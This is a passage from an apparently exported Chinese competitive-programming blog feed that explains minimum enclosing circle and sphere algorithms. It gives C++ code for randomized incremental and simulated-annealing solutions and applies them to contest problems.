class="line"></span><br><span class="line"><span class="function">mt19937 <span class="title">rng</span><span class="params">(chrono::steady_clock::now().time_since_epoch().count())</span></span>;</span><br><span class="line"><span class="function">Circle <span class="title">MinCircle</span><span class="params">(<span class="built_in">vector</span>&lt;Point&gt; pt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sz = pt.size();</span><br><span class="line">    shuffle(pt.begin(), pt.end(), rng);</span><br><span class="line">    <span class="function">Circle <span class="title">cc</span><span class="params">(pt[<span class="number">0</span>], <span class="number">0.0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sz; ++i) <span class="keyword">if</span>(cc.out(pt[i])) &#123;</span><br><span class="line">        cc = Circle(pt[i], <span class="number">0.0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; ++j) <span class="keyword">if</span>(cc.out(pt[j])) &#123;</span><br><span class="line">            cc = Circle((pt[i] + pt[j]) / <span class="number">2.0</span>, length(pt[i]-pt[j]) / <span class="number">2.0</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; j; ++k) &#123;</span><br><span class="line">                <span class="keyword">if</span>(cc.out(pt[k])) &#123;</span><br><span class="line">                    cc = Circle(pt[i], pt[j], pt[k]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;Point&gt; <span class="title">p</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) p[i].scan();</span><br><span class="line">    Circle ans = MinCircle(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.10f\n%.10f %.10f\n&quot;</span>, ans.r, ans.o.x, ans.o.y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="模拟退火法"><a href="#模拟退火法" class="headerlink" title="模拟退火法"></a>模拟退火法</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>模拟退火算法 ( Simulated annealing ) 是一种寻找函数全局最优解的一种算法，它的出发点是物理中固体物质的退火过程与一般组合优化问题之间的相似性。</p><p>寻找全局最优解是一个很麻烦的事情。有人可能说，在一个位置看到哪个方向函数上升，就走向哪个方向不就行了吗？这种方法称为爬山法，爬山法是完完全全的贪心法，每次都鼠目寸光的选择一个当前最优解，因此可能会局限于局部的最优值。如何跳出局部最优呢？</p><p>模拟退火其实也是一种贪心算法，但是它的搜索过程引入了随机因素。模拟退火算法<strong>以一定的概率</strong>来接受一个比当前解要差的解，因此<strong>有可能</strong>会跳出这个局部的最优解，达到全局的最优解。</p><p>模拟退火算法描述：</p><ul><li><p>若 $J( Y(i+1) ) \geq J( Y(i) )$  (即移动后得到更优解)，则总是接受该移动</p></li><li><p>若 $J( Y(i+1) )&lt; J( Y(i) )$  (即移动后的解比当前解要差)，则<strong>以一定的概率</strong>接受移动，而且这个概率随着时间推移逐渐降低（逐渐降低才能趋向稳定），随着能量差的增大而降低。具体来说：</p></li></ul><p>在温度为 $T$ 时，出现能量差为 $\Delta E$ 的降温的概率为 $P(\Delta E)$，表示为：<br>$$<br>P(\Delta E) = e^{\frac {\Delta E} {kT}}<br>$$<br>这里的“一定的概率”的计算参考了金属冶炼的退火过程，这也是模拟退火算法名称的由来。</p><p>关于爬山算法与模拟退火，有一个有趣的比喻：</p><ul><li><p>爬山算法：兔子朝着比现在高的地方跳去。它找到了不远处的最高山峰。但是这座山不一定是珠穆朗玛峰。这就是爬山算法，它不能保证局部最优值就是全局最优值。</p></li><li><p>模拟退火：兔子喝醉了。它随机地跳了很长时间。这期间，它可能走向高处，也可能踏入平地。但是，它渐渐清醒了并朝最高方向跳去。这就是模拟退火。</p></li></ul><p><img src="Hill_Climbing_with_Simulated_Annealing.gif" alt="模拟退火算法图解"></p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>注意这么几件事情：</p><ul><li>模拟退火一般需要进行调参，平衡运行时间、迭代次数、精度等因素</li><li>实现模拟退火时更是要注意各种精度损失。最小圆覆盖问题中，如果不考虑精度问题，求距离时多次调用 <code>sqrt</code> 函数将会损失非常多的精度</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, n) for(int i = 1, i##_end_ = (n); i &lt;= i##_end_; ++i)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> eps = <span class="number">1e-12</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sgn</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fabs</span>(x) &lt; eps) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> x &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x, y;</span><br><span class="line">    Point(<span class="keyword">double</span> xp=<span class="number">0</span>, <span class="keyword">double</span> yp=<span class="number">0</span>): x(xp), y(yp) &#123; &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> + (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x+rhs.x, y+rhs.y); &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> - (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x-rhs.x, y-rhs.y); &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> * (<span class="keyword">const</span> <span class="keyword">double</span>&amp; k) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x*k, y*k); &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> / (<span class="keyword">const</span> <span class="keyword">double</span>&amp; k) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x/k, y/k); &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123; <span class="keyword">return</span> x &lt; rhs.x || (x==rhs.x &amp;&amp; y&lt;rhs.y); &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> == (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123;<span class="keyword">return</span> sgn(x - rhs.x) == <span class="number">0</span> &amp;&amp; sgn(y - rhs.y) == <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function">Point <span class="title">turn</span><span class="params">(<span class="keyword">double</span> rad)</span> </span>&#123; <span class="keyword">return</span> Point(x*<span class="built_in">cos</span>(rad)-y*<span class="built_in">sin</span>(rad), x*<span class="built_in">sin</span>(rad)+y*<span class="built_in">cos</span>(rad)); &#125;</span><br><span class="line">    <span class="function">Point <span class="title">turn90</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Point(-y, x); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">scan</span><span class="params">()</span> </span>&#123; <span class="built_in">scanf</span>(<span class="string">&quot;%lf%lf&quot;</span>, &amp;x, &amp;y); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> Point Vector;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">dot</span><span class="params">(Vector x, Vector y)</span> </span>&#123; <span class="keyword">return</span> x.x*y.x + x.y*y.y; &#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">length</span><span class="params">(Vector x)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">sqrt</span>(dot(x, x)); &#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">dist2</span><span class="params">(Point A, Point B)</span> </span>&#123; <span class="keyword">return</span> dot(A - B, A - B); &#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cross</span><span class="params">(Vector A, Vector B)</span> </span>&#123; <span class="keyword">return</span> A.x*B.y - A.y*B.x; &#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">angle</span><span class="params">(Vector A, Vector B)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">acos</span>(dot(A, B) / length(A) / length(B)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Circle</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Circle</span> &#123;</span></span><br><span class="line">    Point o;</span><br><span class="line">    <span class="keyword">double</span> r;</span><br><span class="line">    Circle(Point O, <span class="keyword">double</span> R): o(O), r(R) &#123; &#125;</span><br><span class="line">    <span class="function">Point <span class="title">at</span><span class="params">(<span class="keyword">double</span> theta)</span> </span>&#123; <span class="keyword">return</span> o + Point(<span class="built_in">cos</span>(theta)*r, <span class="built_in">sin</span>(theta)*r); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">out</span><span class="params">(Point pt)</span> </span>&#123; <span class="keyword">return</span> sgn(length(o-pt) - r) == <span class="number">1</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">mt19937 <span class="title">rng</span><span class="params">(chrono::steady_clock::now().time_since_epoch().count())</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Eval</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;Point&gt;&amp; pt, Point o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> g : pt) res = max(res, dist2(g, o));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">uniform_real_distribution&lt;<span class="keyword">double</span>&gt; <span class="title">rgen</span><span class="params">(<span class="number">0.0</span>, <span class="number">1.0</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Rand</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> rgen(rng); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Circle <span class="title">MinCircleAnneal</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;Point&gt;&amp; pt, <span class="keyword">double</span> T, <span class="keyword">double</span> dec, <span class="keyword">double</span> ed)</span> </span>&#123;</span><br><span class="line">    Point pcur(0.0, 0.0), pbest, pnew;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> sz = pt.size();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> g : pt) pcur = pcur + g;</span><br><span class="line">    pbest = pcur = pcur / sz;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> vcur = Eval(pt, pcur), vnew, vbest = vcur;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(T &gt; ed) &#123;</span><br><span class="line">        pnew = pcur + Point((Rand()*<span class="number">2.0</span><span class="number">-1</span>) * T, (Rand()*<span class="number">2.0</span><span class="number">-1.0</span>) * T);</span><br><span class="line">        vnew = Eval(pt, pnew);</span><br><span class="line">        <span class="keyword">if</span>(vnew &lt;= vbest) vbest = vcur = vnew, pbest = pcur = pnew;</span><br><span class="line">        <span class="keyword">if</span>(vnew &lt;= vcur || Rand() &lt; <span class="built_in">exp</span>(-(vnew-vcur)/T))</span><br><span class="line">            vcur = vnew, pcur = pnew;</span><br><span class="line">        T *= dec;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Circle(pbest, <span class="built_in">sqrt</span>(vbest));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;Point&gt; <span class="title">p</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) p[i].scan();</span><br><span class="line">    Circle ans = MinCircleAnneal(p, <span class="number">100000.0</span>, <span class="number">0.997</span>, <span class="number">3e-11</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.10f\n%.10f %.10f\n&quot;</span>, ans.r, ans.o.x, ans.o.y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h2 id="Opentrains-1519-G"><a href="#Opentrains-1519-G" class="headerlink" title="Opentrains 1519 G"></a>Opentrains 1519 G</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>给你了 $n$ 个定义在区间 $[0,T]$ 上的一次函数 $f_i(x) = a_ix+b_i$ ，定义两个一次函数的距离为：<br>$$<br>dist(f,g) = \left(\max_{0\leq i\leq T} (f(i)-g(i))\right)^2 + \left(\min_{0\leq i\leq T}(f(i)-g(i))\right)^2<br>$$<br>你现在要找一个一次函数 $g(x) = cx+d$ 使得下面的值最小：<br>$$<br>\max_{1\leq i\leq n} dist(f_i, g)<br>$$<br>你只需要输出最小值就可以了。</p><p>数据范围 $1\leq n \leq 200000$</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>乍一看，貌似要想一想。那个最大值与最小值一定在定义域的两个端点或者两个函数相交的地方取到。。。等等，不对啊，看清楚之后，我们会发现，那个平方是加在外面的，因此要我们求最值的函数就是 $f(x)-g(x)$ ，两个一次函数之差还是一次函数！那么最值一个在 $x=0$ 处取得，一个在 $x=T$ 处取得。</p><p>我们用 $f(0)$ 与 $f(T)$ 两个值来表征一个一次函数，可以发现，如果把 $\big(f(0),f(T)\big)$ 作为点画在二维平面上， $dist(f,g)$ 即为这两个点的欧几里得距离。把题中 $n$ 个点都画出来，我们要找一个点使得这个点到其他点的距离的最大值最小，这不就是最小圆覆盖吗！</p><h1 id="最小球覆盖"><a href="#最小球覆盖" class="headerlink" title="最小球覆盖"></a>最小球覆盖</h1><p>那么考虑三维的情况，会是什么样子的呢？2018 ACM-ICPC 南京区域赛的 D 题正是最小球覆盖的裸题。</p><p>大致有两种方法，模拟退火法和三分套三分套三分。（我很奇怪为什么没有随机增量类似的方法了，不过很可能是三维情况下四点定球不是非常好写）。</p><p>模拟退火代码：（2018南京D）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, n) for(int i = 1, i##_end_ = (n); i &lt;= i##_end_; ++i)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> eps = <span class="number">1e-12</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sgn</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fabs</span>(x) &lt; eps) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> x &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x, y, z;</span><br><span class="line">    Point(<span class="keyword">double</span> xp=<span class="number">0</span>, <span class="keyword">double</span> yp=<span class="number">0</span>, <span class="keyword">double</span> zp=<span class="number">0</span>): x(xp), y(yp), z(zp) &#123; &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> + (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x+rhs.x, y+rhs.y, z+rhs.z); &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> - (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x-rhs.x, y-rhs.y, z-rhs.z); &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> * (<span class="keyword">const</span> <span class="keyword">double</span>&amp; k) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x*k, y*k, z*k); &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> / (<span class="keyword">const</span> <span class="keyword">double</span>&amp; k) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x/k, y/k, z/k); &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123; <span class="keyword">return</span> x &lt; rhs.x || (x==rhs.x &amp;&amp; y&lt;rhs.y) || (x==rhs.x&amp;&amp;y==rhs.y&amp;&amp;z&lt;rhs.z); &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> == (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123;<span class="keyword">return</span> sgn(x - rhs.x) == <span class="number">0</span> &amp;&amp; sgn(y - rhs.y) == <span class="number">0</span> &amp;&amp; sgn(z-rhs.z)==<span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">scan</span><span class="params">()</span> </span>&#123; <span class="built_in">scanf</span>(<span class="string">&quot;%lf%lf%lf&quot;</span>, &amp;x, &amp;y, &amp;z); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> Point Vector;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">dot</span><span class="params">(Vector x, Vector y)</span> </span>&#123; <span class="keyword">return</span> x.x*y.x + x.y*y.y + x.z*y.z; &#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">length</span><span class="params">(Vector x)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">sqrt</span>(dot(x, x)); &#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">dist2</span><span class="params">(Point A, Point B)</span> </span>&#123; <span class="keyword">return</span> dot(A - B, A - B); &#125;</span><br><span class="line"><span class="comment">// Circle</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Circle</span> &#123;</span></span><br><span class="line">    Point o;</span><br><span class="line">    <span class="keyword">double</span> r;</span><br><span class="line">    Circle(Point O, <span class="keyword">double</span> R): o(O), r(R) &#123; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">mt19937 <span class="title">rng</span><span class="params">(chrono::steady_clock::now().time_since_epoch().count())</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Eval</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;Point&gt;&amp; pt, Point o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> g : pt) res = max(res, dist2(g, o));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">uniform_real_distribution&lt;<span class="keyword">double</span>&gt; <span class="title">rgen</span><span class="params">(<span class="number">0.0</span>, <span class="number">1.0</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Rand</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> rgen(rng); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Circle <span class="title">MinCircleAnneal</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;Point&gt;&amp; pt, <span class="keyword">double</span> T, <span class="keyword">double</span> dec, <span class="keyword">double</span> ed)</span> </span>&#123;</span><br><span class="line">    Point pcur, pbest, pnew;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> sz = pt.size();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> g : pt) pcur = pcur + g;</span><br><span class="line">    pbest = pcur = pcur / sz;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> vcur = Eval(pt, pcur), vnew, vbest = vcur;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(T &gt; ed) &#123;</span><br><span class="line">        pnew = pcur + Point((Rand()*<span class="number">2.0</span><span class="number">-1</span>) * T, (Rand()*<span class="number">2.0</span><span class="number">-1.0</span>) * T, (Rand()*<span class="number">2.0</span><span class="number">-1</span>) * T);</span><br><span class="line">        vnew = Eval(pt, pnew);</span><br><span class="line">        <span class="keyword">if</span>(vnew &lt;= vbest) vbest = vcur = vnew, pbest = pcur = pnew;</span><br><span class="line">        <span class="keyword">if</span>(vnew &lt;= vcur || Rand() &lt; <span class="built_in">exp</span>(-(vnew-vcur)/T))</span><br><span class="line">            vcur = vnew, pcur = pnew;</span><br><span class="line">        T *= dec;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Circle(pbest, <span class="built_in">sqrt</span>(vbest));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;Point&gt; <span class="title">p</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) p[i].scan();</span><br><span class="line">    <span class="keyword">double</span> ans = <span class="number">1e13</span>;</span><br><span class="line">    rep(i, <span class="number">40</span>) &#123;</span><br><span class="line">        Circle cir = MinCircleAnneal(p, <span class="number">100000.0</span>, <span class="number">0.999</span>, <span class="number">3e-7</span>);</span><br><span class="line">        ans = min(ans, cir.r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.10f\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;最小圆覆盖问题&quot;&gt;&lt;a href=&quot;#最小圆覆盖问题&quot; class=&quot;headerlink&quot; title=&quot;最小圆覆盖问题&quot;&gt;&lt;/a&gt;最小圆覆盖问题&lt;/h1&gt;&lt;p&gt;给出 $N$ 个点，让你画一个最小的包含所有点的圆。输出圆心、半径。&lt;/p&gt;
&lt;p&gt;数据范围 $N\leq 10^5$&lt;/p&gt;
&lt;p&gt;模板提交链接：[&lt;a href=&quot;https://www.luogu.org/problemnew/show/P1742&quot;&gt;Luogu 1742&lt;/a&gt;] [&lt;a href=&quot;https://lydsy.com/JudgeOnline/problem.php?id=1337&quot;&gt;BZOJ 1337&lt;/a&gt;]&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://yangdong2002.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="最小圆覆盖" scheme="http://yangdong2002.github.io/tags/%E6%9C%80%E5%B0%8F%E5%9C%86%E8%A6%86%E7%9B%96/"/>
    
    <category term="模拟退火" scheme="http://yangdong2002.github.io/tags/%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB/"/>
    
  </entry>
  
  <entry>
    <title>一个有趣的期望问题</title>
    <link href="http://yangdong2002.github.io/2019/04/22/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E6%9C%9F%E6%9C%9B%E9%97%AE%E9%A2%98/"/>
    <id>http://yangdong2002.github.io/2019/04/22/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E6%9C%9F%E6%9C%9B%E9%97%AE%E9%A2%98/</id>
    <published>2019-04-21T20:48:19.000Z</published>
    <updated>2019-12-15T14:09:09.733Z</updated>
    
